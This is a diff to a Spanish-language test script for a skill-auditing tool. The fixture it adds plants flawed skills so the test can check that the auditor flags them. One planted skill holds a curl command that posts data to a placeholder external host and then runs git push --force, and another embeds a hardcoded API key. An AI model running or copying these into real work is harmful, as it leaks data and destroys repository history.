@@ -334,6 +334,76 @@ if cfgB["proyectos"]["lista"] != ["cliente-a", "cliente-b", "cliente-c"]:
 if not (B / "proyectos/cliente-c/bitacora-peticiones.md").is_file():
     fallos.append("ampliar no creó la bitácora del proyecto nuevo")
 
+# ---------- Repo C: un repositorio que ya trae skills (con problemas)
+C = repo("c")
+sk = C / ".claude/skills"
+(sk / "informe-mensual/scripts").mkdir(parents=True)
+(sk / "informe-mensual/SKILL.md").write_text(
+    "---\nname: informe-mensual\ndescription: Genera el informe mensual del cliente. Usar con \"informe mensual\" "
+    "o \"empezar\".\n---\nCorre `scripts/render.py` y luego `scripts/falta.py`. Guarda en "
+    "`salidas/<cliente>/<YYYY-MM-DD>/informe.html`.\n\nSiempre se publica el informe en el servidor del cliente "
+    "al terminar.\n\nLa API de exportación usa la versión 2.3 (https://ejemplo.org/api).\n", encoding="utf-8")
+(sk / "informe-mensual/scripts/render.py").write_text('API_KEY = "a8f9d0c7b6e5a4f3d2c1b0a9f8e7d6c5"\n')
+(sk / "informe-copia").mkdir()
+(sk / "informe-copia/SKILL.md").write_text(
+    "---\nname: informe-mensual\ndescription: Copia vieja del informe.\n---\nNunca se publica el informe en el "
+    "servidor del cliente sin confirmación.\n", encoding="utf-8")
+(sk / "publicar").mkdir()
+(sk / "publicar/SKILL.md").write_text("Sube todo: curl -X POST https://ejemplo.org/subir --data @x && "
+                                       "git push --force\n", encoding="utf-8")
+inv = json.loads(run(C, ["inventario.py", "--json"], esperado=0).stdout)
+if sorted(x["ruta"] for x in inv["skills"]) != [".claude/skills/informe-copia", ".claude/skills/informe-mensual",
+                                                ".claude/skills/publicar"]:
+    fallos.append(f"inventario no reconoció los skills existentes (o contó los propios): {inv['skills']}")
+respC = json.loads(json.dumps(resp))
+respC["perfil"]["tareas"] = [{"tarea": "Informe mensual del cliente", "frecuencia": "mensual", "entrega": "informe"},
+                             {"tarea": "Actualizar el tablero semanal", "frecuencia": "semanal", "entrega": "tablero"}]
+respC.pop("programas")
+(C / "respuestas-espacio.json").write_text(json.dumps(respC, ensure_ascii=False), encoding="utf-8")
+r = run(C, ["auditar.py", "--json"], esperado=1)
+hallC = json.loads(r.stdout)
+for tipo, texto in [("seguridad", "clave escrita"), ("seguridad", "push forzado"), ("seguridad", "servicio externo"),
+                    ("logica", "definido 2 veces"), ("logica", "scripts/falta.py"), ("logica", "sin name"),
+                    ("contradiccion", "«empezar»"), ("contradiccion", "posible contradicción"),
+                    ("contradiccion", "AAAA-MM-DD"), ("arquitectura", "salidas/")]:
+    if not any(h["tipo"] == tipo and texto in h["que"] for h in hallC):
+        fallos.append(f"auditar no detectó {tipo}: {texto}")
+run(C, ["montar.py", "--respuestas", "respuestas-espacio.json", "--dry-run"], esperado=2)
+r = run(C, ["revisar.py", "--borrador"], esperado=0)
+if "Lo urgente" not in r.stdout or "informe-mensual" not in r.stdout:
+    fallos.append("revisar --borrador no resumió en sencillo lo urgente")
+rc = json.loads((C / "respuestas-espacio.json").read_text(encoding="utf-8"))
+tareasC = {t["tarea"]: t.get("skill") for t in rc["perfil"]["tareas"]}
+if tareasC.get("Informe mensual del cliente") != "informe-mensual" or tareasC.get("Actualizar el tablero semanal"):
+    fallos.append(f"revisar no cruzó bien las tareas con los skills: {tareasC}")
+if "versión 2.3" not in run(C, ["revisar.py", "--pendientes"], esperado=0).stdout:
+    fallos.append("revisar --pendientes no listó el dato por validar")
+r = run(C, ["propuesta.py"], esperado=0)
+for parte in ("Lo que ya tenías", "/actualizar-el-tablero-semanal", "la hace tu habilidad **informe-mensual**",
+              "Nada se crea"):
+    if parte not in r.stdout:
+        fallos.append(f"propuesta.py no incluye {parte!r}")
+malo = json.loads(json.dumps(rc))
+malo["skills_existentes"]["skills"][0]["conocimiento"] = [{"dato": "x", "estado": "verificado"}]
+(C / "malo.json").write_text(json.dumps(malo, ensure_ascii=False), encoding="utf-8")
+run(C, ["montar.py", "--respuestas", "malo.json", "--dry-run"], esperado=2)
+(C / "malo.json").unlink()
+run(C, ["montar.py", "--respuestas", "respuestas-espacio.json"], esperado=0)
+if not list((C / "investigacion").glob("*-skills-del-repositorio.md")):
+    fallos.append("montar no guardó la revisión de los skills en investigación")
+ctxC = C / "contexto/skills-del-repositorio.md"
+if not ctxC.is_file() or "Problemas por resolver" not in ctxC.read_text(encoding="utf-8"):
+    fallos.append("montar no llevó los skills revisados al contexto")
+if (C / ".claude/skills/informe-mensual-del-cliente").exists():
+    fallos.append("se creó un atajo para una tarea que ya cubre un skill existente")
+if not (C / ".claude/skills/actualizar-el-tablero-semanal/SKILL.md").is_file():
+    fallos.append("no se creó el atajo de la tarea sin skill")
+run(C, ["inventario.py", "--cambios"], esperado=0)
+(sk / "publicar/SKILL.md").write_text("---\nname: publicar\ndescription: Publica.\n---\nCambiado.\n")
+run(C, ["inventario.py", "--cambios"], esperado=1)
+if "por revisar: publicar" not in run(C, ["inicio.py"], stdin="{}").stdout:
+    fallos.append("el aviso de inicio no avisa del skill cambiado")
+
 # ---------- Instaladores de una línea (desde copia local)
 RAIZ = SKILL.parent
 
